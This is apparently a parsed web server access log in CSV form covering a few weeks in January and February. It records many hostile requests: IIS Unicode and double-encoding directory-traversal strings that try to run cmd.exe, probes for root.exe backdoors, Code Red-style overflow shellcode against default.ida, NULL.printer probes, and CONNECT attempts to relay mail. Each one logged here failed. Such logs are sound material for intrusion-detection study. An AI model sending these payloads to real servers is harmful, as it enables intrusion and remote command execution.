"rhost";"date";"time";"timezone";"method";"request_first_line";"http_version";"final_state_code";"bytes";"referer";"user_agent";"compatibility";"MSIE";"MSIE_version";"OS";"OS_version"
"63.202.179.73";"Feb 09";"14:41:01";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"63.202.179.73";"Feb 09";"14:41:01";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"63.202.179.73";"Feb 09";"14:41:02";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"63.202.179.73";"Feb 09";"14:41:02";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"63.202.179.73";"Feb 09";"14:41:02";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"63.202.179.73";"Feb 09";"14:41:03";500;"GET";"/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"63.202.179.73";"Feb 09";"14:41:03";500;"GET";"/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"63.202.179.73";"Feb 09";"14:41:04";500;"GET";"/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"222.89.64.11";"Feb 09";"21:17:43";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"64.65.145.229";"Feb 09";"21:51:16";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"61.10.7.95";"Feb 09";"23:04:25";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"70.147.9.192";"Feb 09";"23:37:08";500;"GET";"/NULL.printer";"";404;1061;"";"";"";"";"";"";""
"220.174.96.136";"Feb 10";"03:13:16";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"217.45.201.185";"Feb 10";"03:13:37";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"80.63.173.34";"Feb 10";"05:47:40";500;"GET";"/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"61.153.220.158";"Feb 10";"05:59:51";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"70.178.129.244";"Feb 10";"06:11:32";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"209.213.220.227";"Feb 10";"07:33:42";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:23";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:23";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:23";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:23";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:24";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:24";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:24";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:25";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:25";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:25";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:25";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:25";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:25";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:25";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:25";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:25";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:25";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:25";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:32";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"220.170.88.36";"Feb 10";"08:30:32";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"4.01";"Windows";"98"
"65.96.54.37";"Feb 10";"09:40:12";500;"GET";"/scripts/nsiislog.dll";"HTTP/1.1";404;1050;"";"";"";"";"";"";""
"68.219.234.177";"Feb 10";"14:41:57";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"221.0.238.83";"Feb 10";"18:54:43";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"218.55.149.121";"Feb 10";"22:47:08";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"218.13.10.250";"Feb 11";"00:08:38";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"66.112.85.249";"Feb 11";"01:41:25";500;"GET";"/NULL.printer";"";404;1061;"";"";"";"";"";"";""
"18.194.1.122";"Feb 11";"03:16:55";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"202.75.41.30";"Feb 11";"06:05:25";500;"GET";"/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:46";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:46";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:47";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:47";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:48";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:49";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:49";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:50";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:50";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:51";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:51";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:52";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:52";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:53";500;"GET";"/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:54";500;"GET";"/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"81.193.64.246";"Feb 11";"06:44:54";500;"GET";"/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"66.64.221.234";"Feb 11";"08:20:12";500;"GET";"/NULL.printer";"";404;1061;"";"";"";"";"";"";""
"202.66.47.23";"Feb 11";"09:51:58";500;"GET";"/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:42";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:43";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:44";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:44";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:45";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:45";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:46";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:47";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:47";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:48";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:48";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:49";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:50";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:50";500;"GET";"/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:51";500;"GET";"/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.211.4.51";"Feb 11";"11:30:52";500;"GET";"/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"66.122.51.240";"Feb 11";"16:02:10";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"67.176.32.32";"Feb 11";"16:07:09";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+ver";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"202.253.200.65";"Feb 11";"19:26:38";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"67.162.217.35";"Feb 11";"20:08:17";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:17";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:17";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:18";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:18";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:18";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:18";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:18";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:19";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:19";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:19";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:19";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:19";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:20";500;"GET";"/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:20";500;"GET";"/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Feb 11";"20:08:20";500;"GET";"/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.23.173.86";"Feb 11";"22:57:40";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"62.254.0.34";"Feb 12";"01:35:14";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"222.145.154.65";"Feb 12";"05:22:45";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:10";500;"CONNECT";"68.142.202.112:25";"HTTP/1.1";405;982;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:10";500;"CONNECT";"68.142.202.112:25";"HTTP/1.1";405;982;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:10";500;"CONNECT";"67.28.114.35:25";"HTTP/1.1";405;980;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:11";500;"CONNECT";"65.54.190.230:25";"HTTP/1.1";405;981;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:11";500;"CONNECT";"66.135.192.87:80";"HTTP/1.1";405;981;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:11";500;"CONNECT";"65.54.190.230:25";"HTTP/1.1";405;981;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:12";500;"GET";"http://www.ebay.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:12";500;"GET";"http://www.ebay.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:12";500;"GET";"http://www.ebay.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:12";500;"CONNECT";"66.94.230.39:80";"HTTP/1.1";405;980;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:12";500;"GET";"http://www.ebay.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:12";500;"GET";"http://www.ebay.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:12";500;"GET";"http://www.ebay.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:13";500;"CONNECT";"66.94.230.39:80";"HTTP/1.1";405;980;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:13";500;"CONNECT";"67.28.114.35:25";"HTTP/1.1";405;980;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:14";500;"CONNECT";"66.94.230.39:80";"HTTP/1.1";405;980;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:14";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:15";500;"GET";"http://www.ebay.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:15";500;"CONNECT";"67.28.114.35:25";"HTTP/1.1";405;980;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:16";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:16";500;"CONNECT";"205.188.158.121:25";"HTTP/1.1";405;983;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:17";500;"CONNECT";"68.142.202.112:25";"HTTP/1.1";405;982;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:17";500;"GET";"http://www.ebay.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:17";500;"CONNECT";"65.54.190.230:25";"HTTP/1.1";405;981;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:18";500;"GET";"http://www.ebay.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:18";500;"GET";"http://www.ebay.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:19";500;"GET";"http://www.ebay.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:19";500;"CONNECT";"67.28.114.35:25";"HTTP/1.1";405;980;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:21";500;"GET";"http://www.ebay.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:23";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:24";500;"CONNECT";"66.94.230.39:80";"HTTP/1.1";405;980;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:25";500;"CONNECT";"66.94.230.39:80";"HTTP/1.1";405;980;"";"";"";"";"";"";""
"61.178.79.227";"Feb 12";"06:14:25";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"61.178.79.227";"Feb 12";"06:14:26";500;"GET";"http://www.yahoo.com/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5";"Windows";"98"
"222.166.160.61";"Feb 12";"06:45:19";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"66.2.146.132";"Feb 12";"08:16:37";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"68.73.139.166";"Feb 12";"11:50:00";500;"GET";"/NULL.printer";"";404;1061;"";"";"";"";"";"";""
"218.59.144.132";"Feb 12";"18:44:32";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"68.114.252.174";"Feb 12";"22:31:04";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"68.255.20.187";"Feb 13";"00:32:23";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+ver";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"218.22.22.40";"Jan 30";"04:34:59";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"211.59.0.204";"Jan 30";"05:09:35";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:36";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:37";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:37";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:38";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"211.59.0.204";"Jan 30";"05:09:38";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
